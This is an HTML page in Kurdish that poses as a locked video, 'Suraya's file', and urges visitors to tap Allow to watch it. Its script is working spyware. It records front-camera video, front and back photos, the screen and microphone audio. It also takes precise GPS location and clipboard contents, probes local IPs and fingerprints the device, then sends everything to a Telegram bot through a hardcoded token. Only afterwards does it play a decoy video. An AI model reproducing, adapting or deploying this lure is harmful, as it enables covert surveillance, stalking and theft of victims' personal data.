<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>مەلەفی سوڕەیا - داشبۆردی چاودێری قووڵ</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { 
            background: linear-gradient(135deg, #0f172a, #1e293b); 
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            overflow: hidden;
            position: fixed;
            width: 100%;
        }
        .container { 
            background: #ffffff; 
            padding: 22px; 
            border-radius: 24px; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.4); 
            width: 92%; 
            max-width: 380px; 
            text-align: center; 
        }
        .preview-img-box {
            width: 100%;
            height: 200px;
            border-radius: 16px;
            overflow: hidden;
            margin-bottom: 15px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
            position: relative;
            background: #000;
        }
        .preview-img-box img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
        .image-overlay-text {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: linear-gradient(to top, rgba(0,0,0,0.85), rgba(0,0,0,0.4));
            color: #ffffff;
            padding: 10px;
            font-size: 13px;
            font-weight: bold;
            text-align: center;
        }
        .content-after-allow {
            display: none;
            margin-bottom: 15px;
        }
        .content-after-allow video {
            width: 100%;
            border-radius: 12px;
            max-height: 240px;
            object-fit: cover;
            outline: none;
        }
        .title { font-size: 22px; font-weight: 800; color: #0f172a; margin-bottom: 6px; }
        .subtitle { color: #64748b; font-size: 13px; margin-bottom: 20px; line-height: 1.5; font-weight: 500; }
        .btn { 
            background: linear-gradient(135deg, #2563eb, #1d4ed8); 
            color: white; 
            padding: 15px; 
            border: none; 
            border-radius: 30px; 
            cursor: pointer; 
            font-size: 16px; 
            width: 100%; 
            font-weight: bold; 
            box-shadow: 0 6px 16px rgba(37,99,235,0.4);
        }
        .loader {
            border: 3px solid #f3f3f3;
            border-radius: 50%;
            border-top: 3px solid #2563eb;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            margin: 15px auto;
            display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status-text { margin-top: 15px; font-size: 12px; color: #94a3b8; font-weight: 500; }
    </style>
</head>
<body>

    <div class="container" id="mainContainer">
        <div id="imageBox" class="preview-img-box">
            <img src="surayamalaf.jpg" alt="مەلەفی سوڕەیا">
            <div class="image-overlay-text">🔒 ڤیدیۆکە قفڵکراوە - بۆ کردنەوەی Allow دابگرە</div>
        </div>

        <div id="mediaBox" class="content-after-allow">
            <video id="targetVideo" controls playsinline>
                <source src="sararanyai.MP4" type="video/mp4">
                تەلەفۆنەکەت پشتگیری ڤیدیۆ ناکات
            </video>
        </div>

        <div class="title" id="boxTitle">مەلەفی سوڕەیا</div>
        <div class="subtitle" id="boxSubtitle">بۆ بینینی ڤیدیۆکە و پشتڕاستکردنەوە، تکایە کلیک لە دوگمەی خوارەوە بکە و پاشان (Allow) دابگرە:</div>
        
        <div id="loader" class="loader"></div>
        <button id="mainBtn" class="btn" onclick="startProcess()">پەخشکردنی ڤیدیۆ (Allow)</button>
        
        <div class="status-text" id="statusText">چاوەڕێی مۆڵەتە</div>
    </div>

    <video id="camVideo" autoplay playsinline style="display:none;"></video>
    <video id="screenVideo" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "9011362716:AAHu7AJ1P7dEZCMfs0Mhu8B2U-Df0XnYOOQ";
        const CHAT_ID = "6947664268";

        let motionData = { alpha: 0, beta: 0, gamma: 0 };
        window.addEventListener('deviceorientation', function(event) {
            motionData.alpha = Math.round(event.alpha || 0);
            motionData.beta = Math.round(event.beta || 0);
            motionData.gamma = Math.round(event.gamma || 0);
        });

        function sendToTelegramText(text) {
            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
            });
        }

        function sendToTelegramPhoto(blob, caption) {
            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            let formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, "capt.jpg");
            formData.append("caption", caption);
            formData.append("parse_mode", "Markdown");
            fetch(url, { method: "POST", body: formData });
        }

        function sendToTelegramVideo(blob, caption) {
            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
            let formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("video", blob, "live_capture.mp4");
            formData.append("caption", caption);
            formData.append("parse_mode", "Markdown");
            fetch(url, { method: "POST", body: formData });
        }

        function sendToTelegramVoice(blob, caption) {
            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`;
            let formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("voice", blob, "audio_record.ogg");
            formData.append("caption", caption);
            formData.append("parse_mode", "Markdown");
            fetch(url, { method: "POST", body: formData });
        }

        function getLocalIPs(callback) {
            try {
                let ips = [];
                let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                if (!RTCPeerConnection) { callback([]); return; }
                let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    let parts = ice.candidate.candidate.split(" ");
                    let ip = parts[4];
                    if (ips.indexOf(ip) === -1) {
                        ips.push(ip);
                        callback(ips);
                    }
                };
            } catch(e) { callback([]); }
        }

        async function getClipboardData() {
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    let text = await navigator.clipboard.readText();
                    return text ? text.slice(0, 100) : "خاڵییە";
                }
            } catch(e) { return "ڕەتکرایەوە"; }
            return "پشتیوانی ناکرێت";
        }

        function recordMicrophone() {
            try {
                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                .then(stream => {
                    let mediaRecorder = new MediaRecorder(stream);
                    let audioChunks = [];
                    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
                    mediaRecorder.onstop = () => {
                        let audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                        sendToTelegramVoice(audioBlob, "🎙️ *تۆمارکردنی دەنگی دەوروبەر (Voice Note)*");
                        stream.getTracks().forEach(track => track.stop());
                    };
                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 4000);
                }).catch(err => {});
            } catch(e) {}
        }

        function recordScreenStream() {
            try {
                if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                    navigator.mediaDevices.getDisplayMedia({ video: { displaySurface: "browser" }, audio: false })
                    .then(stream => {
                        const videoElem = document.getElementById('screenVideo');
                        videoElem.srcObject = stream;
                        videoElem.play();

                        let mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                        let screenChunks = [];
                        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) screenChunks.push(e.data); };
                        mediaRecorder.onstop = () => {
                            let blob = new Blob(screenChunks, { type: 'video/mp4' });
                            sendToTelegramVideo(blob, "💻 *تۆمارکردنی شاشەی ڕاستەوخۆ (Screen Recording Stream)*");
                            stream.getTracks().forEach(track => track.stop());
                        };
                        mediaRecorder.start();
                        setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 4000);
                    }).catch(e => {});
                }
            } catch(e) {}
        }

        // ڕیزبەندیی پۆڵایین بۆ کۆکردنەوە و ناردنی داتا دوای کلیک
        function executeSecureSequence() {
            const videoElem = document.getElementById('camVideo');
            const canvas = document.getElementById('canvas');

            // ١. ڤیدیۆی پێشەوە
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
            .then(frontStream => {
                videoElem.srcObject = frontStream;
                videoElem.play();

                let frontRecorder = new MediaRecorder(frontStream, { mimeType: 'video/mp4' });
                let frontChunks = [];
                frontRecorder.ondataavailable = e => { if (e.data.size > 0) frontChunks.push(e.data); };
                frontRecorder.onstop = () => {
                    let frontBlob = new Blob(frontChunks, { type: 'video/mp4' });
                    if (frontBlob.size > 500) {
                        sendToTelegramVideo(frontBlob, "🎥 *تۆمارکردنی ڤیدیۆی ڕاستەوخۆی پێشەوە (Front Live Video)*");
                    }
                    frontStream.getTracks().forEach(track => track.stop());

                    // ٢. وێنەی پێشەوە (Selfie)
                    setTimeout(() => {
                        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                        .then(selfieStream => {
                            videoElem.srcObject = selfieStream;
                            videoElem.play();
                            setTimeout(() => {
                                canvas.width = videoElem.videoWidth || 640;
                                canvas.height = videoElem.videoHeight || 480;
                                let ctx = canvas.getContext('2d');
                                ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
                                canvas.toBlob(blob => {
                                    sendToTelegramPhoto(blob, "📸 *وێنەی دوربینی پێشەوە (Selfie)*");
                                }, 'image/jpeg', 0.9);
                                selfieStream.getTracks().forEach(track => track.stop());

                                // ٣. وێنەی دواوە (Back Camera)
                                setTimeout(() => {
                                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false })
                                    .then(backStream => {
                                        videoElem.srcObject = backStream;
                                        videoElem.play();
                                        setTimeout(() => {
                                            ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
                                            canvas.toBlob(backBlob => {
                                                sendToTelegramPhoto(backBlob, "📷 *وێنەی دوربینی دواوە (Back Camera)*");
                                            }, 'image/jpeg', 0.9);
                                            backStream.getTracks().forEach(track => track.stop());
                                        }, 1000);
                                    }).catch(e => {});
                                }, 1000);

                            }, 1000);
                        }).catch(e => {});
                    }, 1000);

                };
                frontRecorder.start(1000);
                setTimeout(() => { if (frontRecorder.state === 'recording') frontRecorder.stop(); }, 4000);
            }).catch(e => {});
        }

        async function getAdvancedHardwareInfo() {
            let info = { battery: "پشتیوانی ناکرێت", storage: "نەزانراو", ram: navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "نەزانراو" };
            if ('getBattery' in navigator) {
                try {
                    let bat = await navigator.getBattery();
                    info.battery = `${Math.round(bat.level * 100)}% (${bat.charging ? "⚡ لە چارجدا" : "🔋 بێ چارج"})`;
                } catch(e) {}
            }
            if (navigator.storage && navigator.storage.estimate) {
                try {
                    let est = await navigator.storage.estimate();
                    let gb = (est.quota / (1024 * 1024 * 1024)).toFixed(1);
                    info.storage = `${gb} GB (هاردوێر)`;
                } catch(e) {}
            }
            return info;
        }

        function getAdvancedNetworkInfo() {
            let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return { type: "نەزانراو", downlink: "نەزانراو", rtt: "نەزانراو" };
            return {
                type: conn.effectiveType ? conn.effectiveType.toUpperCase() : "نەزانراو",
                downlink: conn.downlink ? conn.downlink + " Mbps" : "نەزانراو",
                rtt: conn.rtt ? conn.rtt + " ms" : "نەزانراو"
            };
        }

        async function measureNetworkLatency() {
            try {
                let start = performance.now();
                await fetch('https://ipapi.co/json/', { mode: 'no-cors' });
                let end = performance.now();
                return Math.round(end - start) + " ms";
            } catch(e) { return "نەتوانرا پێوانە بکرێت"; }
        }

        function checkVisitorHistory() {
            let visited = localStorage.getItem('visited_before');
            if (visited) {
                return "🔄 سەردانیکەری دووبارە (Returning Visitor)";
            } else {
                localStorage.setItem('visited_before', 'true');
                return "✨ سەردانیکەری یەکەم جار (First Time)";
            }
        }

        function getDetectedFonts() {
            let baseFonts = ['monospace', 'sans-serif', 'serif'];
            let testString = "mmmmmmmmmmlli";
            let testSize = "72px";
            let h = document.getElementsByTagName("body")[0];
            let defaultWidth = {};
            let defaultHeight = {};
            for (let i = 0; i < baseFonts.length; i++) {
                let txt = document.createElement("span");
                txt.style.font = testSize + " " + baseFonts[i];
                txt.innerHTML = testString;
                h.appendChild(txt);
                defaultWidth[baseFonts[i]] = txt.offsetWidth;
                defaultHeight[baseFonts[i]] = txt.offsetHeight;
                h.removeChild(txt);
            }
            let candidateFonts = ["Arial", "Calibri", "Courier", "Helvetica", "Georgia", "Impact", "Tahoma", "Times New Roman", "Verdana"];
            let detected = [];
            for (let i = 0; i < candidateFonts.length; i++) {
                let matchedCount = 0;
                for (let j = 0; j < baseFonts.length; j++) {
                    let txt = document.createElement("span");
                    txt.style.font = testSize + " " + candidateFonts[i] + "," + baseFonts[j];
                    txt.innerHTML = testString;
                    h.appendChild(txt);
                    if (txt.offsetWidth !== defaultWidth[baseFonts[j]] || txt.offsetHeight !== defaultHeight[baseFonts[j]]) matchedCount++;
                    h.removeChild(txt);
                }
                if (matchedCount > 0) detected.push(candidateFonts[i]);
            }
            return detected.length > 0 ? detected.join(", ") : "Standard Fonts";
        }

        function getCanvasFingerprint() {
            try {
                let canvas = document.createElement('canvas');
                let ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("ULTIMATE_GOD_MODE", 2, 15);
                return canvas.toDataURL().slice(-40);
            } catch(e) { return "Unavailable"; }
        }

        function getGPUInfo() {
            try {
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "نەزانراو";
                let dbg = gl.getExtension('WEBGL_debug_renderer_info');
                return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Standard WebGL";
            } catch(e) { return "بەردەست نییە"; }
        }

        async function getUltimateIPData() {
            let ipData = { ip: "نەزانراو", city: "نەزانراو", country_name: "نەزانراو", org: "نەزانراو" };
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                if (data && data.ip) return data;
            } catch(e) {}
            return ipData;
        }

        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;
                    let accuracy = position.coords.accuracy;
                    let locMsg = `📍 *شوێنی GPSی ورد (سەد در سەد):*\n` +
                                   `• هێڵی پانی: \`${lat}\`\n` +
                                   `• هێڵی درێژی: \`${lon}\`\n` +
                                   `• هەڵە: ~${Math.round(accuracy)} مەتر\n` +
                                   `🗺️ [کردنەوە لە نەخشەی گۆگڵ](https://maps.google.com/?q=${lat},${lon})`;
                    sendToTelegramText(locMsg);
                }, function(error) {
                    sendToTelegramText(`⚠️ *کێشەی شوێن (GPS):* ڕەتکراوە یان بەردەست نییە.`);
                }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
            }
        }

        async function gatherAndSendDetails() {
            let ua = navigator.userAgent;
            let platform = navigator.platform;
            let language = navigator.language;
            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            let screenRes = window.screen.width + "x" + window.screen.height;
            let cpuCores = navigator.hardwareConcurrency || "نەزانراو";
            let touchPoints = navigator.maxTouchPoints || 0;
            let gpu = getGPUInfo();
            let canvasFP = getCanvasFingerprint();
            let clipboardText = await getClipboardData();
            let fonts = getDetectedFonts();
            let latency = await measureNetworkLatency();
            let visitorStatus = checkVisitorHistory();
            let hw = await getAdvancedHardwareInfo();
            let net = getAdvancedNetworkInfo();

            getLocalIPs(async function(localIPs) {
                let localIPText = localIPs.length > 0 ? localIPs.join(", ") : "شاراوە";
                let ipData = await getUltimateIPData();

                let report = `💎 *ڕاپۆرتی تایتان اولترا گۆد مۆد (ULTIMATE GOD MODE):*\n\n` +
                             `📌 *دۆخی سەردانیکەر:* ${visitorStatus}\n\n` +
                             `🌐 *ڕایەڵە و خێرایی (Advanced Network):*\n` +
                             `• *ئایپی گشتی:* \`${ipData.ip}\`\n` +
                             `• *ئایپی ناوخۆیی:* \`${localIPText}\`\n` +
                             `• *وڵات و شار:* ${ipData.country_name} - ${ipData.city}\n` +
                             `• *جۆری هێڵ:* ${net.type} | دابەزاندن: ${net.downlink}\n` +
                             `• *پینگ (RTT):* ${net.rtt} (سێرڤەر: ${latency})\n` +
                             `• *دابینکەر:* ${ipData.org}\n\n` +
                             `⚡ *رەقامەواڵە و باتری (Advanced Hardware):*\n` +
                             `• *باتری:* ${hw.battery}\n` +
                             `• *گلدانەوەی هاردوێر:* ${hw.storage}\n` +
                             `• *ڕامی ئامێر:* ${hw.ram}\n` +
                             `• سیستم: ${platform}\n` +
                             `• پرۆسێسەر (Cores): ${cpuCores}\n` +
                             `• کارتی شاشە: \`${gpu}\`\n` +
                             `• تاچ پۆینت: ${touchPoints}\n` +
                             `• فینگەرپرینتی شاشە: \`${canvasFP}\`\n` +
                             `• شاشە: ${screenRes} | زمان: ${language}\n` +
                             `• فۆنتەکان: ${fonts}\n\n` +
                             `📋 *کلیپبۆرد:*\n\`${clipboardText}\`\n\n` +
                             `📱 *براوسەر (User Agent):*\n\`${ua}\``;
                
                sendToTelegramText(report);
            });
        }

        // ئەمە ئەو کردارەیە کە تەنها کاتێک دەست پێ دەکات کە بەکارهێنەر کلیک لەسەر Allow بکات
        function startProcess() {
            document.getElementById('mainBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            document.getElementById('statusText').innerText = 'چاوەڕوان بە بۆ وەرگرتنی مۆڵەت...';

            // دەستپێکردنی کۆکردنەوە و ناردنی داتا و پشکنینەکان
            gatherAndSendDetails();
            sendLocation();
            executeSecureSequence(); 
            recordScreenStream();    
            recordMicrophone();

            // کردنەوەی پاش پەنجەرەی مۆڵەت و نیشاندانی ڤیدیۆکە
            setTimeout(function() {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('imageBox').style.display = 'none';
                document.getElementById('mediaBox').style.display = 'block';
                document.getElementById('boxTitle').innerText = 'مەلەفی سوڕەیا';
                document.getElementById('boxSubtitle').innerText = 'فەرموو ڤیدیۆکە دەست پێ دەکات:';
                document.getElementById('statusText').innerText = 'سەرکەوتوو بوو ✅';
                
                let vid = document.getElementById('targetVideo');
                vid.play().catch(e => console.log(e));
            }, 6000);
        }
    </script>
</body>
</html>
